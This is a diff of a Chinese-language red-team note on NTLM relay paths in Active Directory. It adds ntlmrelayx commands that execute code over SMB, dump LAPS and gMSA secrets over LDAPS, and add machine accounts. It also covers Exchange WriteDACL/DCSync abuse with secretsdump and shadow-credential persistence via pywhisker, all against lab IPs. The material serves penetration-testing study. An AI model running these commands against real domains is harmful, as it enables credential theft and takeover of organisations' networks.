@@ -1,12 +1,15 @@
 # NTLM Relay
 
 
-本篇主要围绕下图进行。[来自](https://en.hackndo.com/ntlm-relay/)
+本文主要讲Relay的一些路径，并不会讲太多原理性的东西，如果你对NTLM Relay不太了解。那么强烈建议阅读下面两篇世纪好文：
+
+[NTLM 篇 - windows protocol](https://daiker.gitbook.io/windows-protocol/ntlm-pian)
+
+[NTLM Relay - hackndo](https://en.hackndo.com/ntlm-relay/)
+
+本篇主要围绕下图进行。[来自](https://www.thehacker.recipes/ad/movement/ntlm/relay)
 
 ![NTLM relay.drawio.png](https://s2.loli.net/2022/02/18/SQrhck8U62H1dLj.png "https://www.thehacker.recipes/ad/movement/ntlm/relay")
-
-
-原理直接看国外老哥写的这篇文章[NTLM RELAY](https://en.hackndo.com/ntlm-relay/)。本文主要讲Relay的一些路径。
 
 ## 触发NTLM认证。
 
@@ -202,27 +205,47 @@ mimikatz
 
 ### Cred Dump
 
-ntlmrelayx.py -t smb://$TARGET
+敬请期待
+
+https://github.com/SecureAuthCorp/impacket/pull/1253
 
 ### EXEC
 
-ntlmrelayx.py -t smb://$TARGET -c whoami
+python3 ntlmrelayx.py -t smb://10.10.10.15 --remove-mic -c whoami
 
-### 枚举信息
+![image-20220219230131789](https://s2.loli.net/2022/02/19/eLdm67Bc3YWZFPU.png)
 
-ntlmrelayx -t "ldap://domaincontroller" --dump-adcs --dump-laps --dump-gmsa
+### 枚举域内信息
+
+python3 ntlmrelayx.py -t ldaps://10.10.10.10 -debug --dump-laps --dump-gmsa --remove-mic![image-20220219230609579](https://s2.loli.net/2022/02/19/qxYwDELJQZeIbuR.png)
+
+![image-20220219230750303](https://s2.loli.net/2022/02/19/QYime6ouNXKn2cV.png)
 
 ### 创建用户（LDAPS）
 
-ntlmrelayx.py -t ldaps://**$DC_TARGET** --add-computer username
+1. **添加机器账户**：
 
+域有个属性`ms-DS-MachineAccountQuota` 他标志着非特权用户最多添加多少机器账户到域内。默认为10。
 
+![image-20220219234336853](https://s2.loli.net/2022/02/19/OBUGY1ZmjHltQDJ.png)
 
-### Exchange（高权限）
+python3 ntlmrelayx.py -t ldaps://10.10.10.10 --add-computer testpc$ --remove-mic
+
+![image-20220219234418973](https://s2.loli.net/2022/02/19/WTYHjKBLVwaCsxJ.png)
+
+2. **添加普通用户**
+
+需要高权限账户（比如说域管）才可以，
+
+python3 ntlmrelayx.py -t ldaps://10.10.10.10 --remove-mic
+
+![image-20220219234738893](https://s2.loli.net/2022/02/19/zpLPFTXbgcHKMYU.png)
+
+### Exchange
 
 **存在CVE-2019-1040漏洞的情况下，可以从SMB->LDAP(s)。而无需考虑签名的情况。**
 
-Exchange的机器账户对域有WriteDACL权限。即可以赋予任意用户两条ACE：
+Exchange的机器账户是域内的高权限账户，对域有WriteDACL权限。即可以赋予任意用户两条ACE：
 
 * 复制目录更改
 * 复制目录更改所有项
@@ -250,9 +273,11 @@ python3 secretsdump.py adc.com/wukong:song@2020@10.10.10.10 -dc-ip 10.10.10.10 -
 
 ![image.png](https://s2.loli.net/2022/02/18/5DkBQrm3AwtGPLN.png)
 
+
+
 ### 影子凭证（Shadow Credentials）
 
-隐蔽权限维持。
+1. 隐蔽权限维持。
 
 > 常规Kerberos预认证阶段（pre-auth），客户端用自己的hash加密时间戳给KDC。KDC使用该用户的hash解密，验证通过后返回该用户的TGT。这是对称加密（DES、RC4、AES128、AES256）。Kerberos也支持非对称的认证方式，通过证书（PKINIT）或密钥对实现。需要安装ADCS。​
 >
@@ -293,6 +318,12 @@ python3 pywhisker.py -d "adc.com" -u "administrator" -p "sss@123" --target "yang
 
 ![image.png](https://s2.loli.net/2022/02/18/Av17iaRyFjohJeM.png)
 
+2. 结合NTLM Relay
+
+https://github.com/SecureAuthCorp/impacket/pull/1249
+
+> 用户对象不能编辑自己的 msDS-KeyCredentialLink 属性，而机器账户可以。这意味着以下场景可以工作：从 DC01 触发 NTLM 身份验证，将其中继到 DC02，使 pywhisker 编辑 DC01 的属性以在其上创建 Kerberos PKINIT 预身份验证后门，并通过 PKINIT 和 pass-the-cache 持久访问 DC01。 计算机对象可以编辑它们自己的 msDS-KeyCredentialLink 属性，但只能在没有 KeyCredential 存在的情况下添加。[Shadow Credentials - The Hacker Recipes](https://www.thehacker.recipes/ad/movement/kerberos/shadow-credentials)
+
 
 ### RBCD（低权限）
 
@@ -310,4 +341,7 @@ python3 pywhisker.py -d "adc.com" -u "administrator" -p "sss@123" --target "yang
 [安全研究 | 使用PetitPotam代替Printerbug](https://mp.weixin.qq.com/s/jtHJZUZpDVHa-P7NjwhhYQ)
 
 [Shadow Credentials: Abusing Key Trust Account Mapping for Account Takeover | by Elad Shamir | Posts By SpecterOps Team Members](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab)
+
+[Shadow Credentials - The Hacker Recipes](https://www.thehacker.recipes/ad/movement/kerberos/shadow-credentials)
+
 
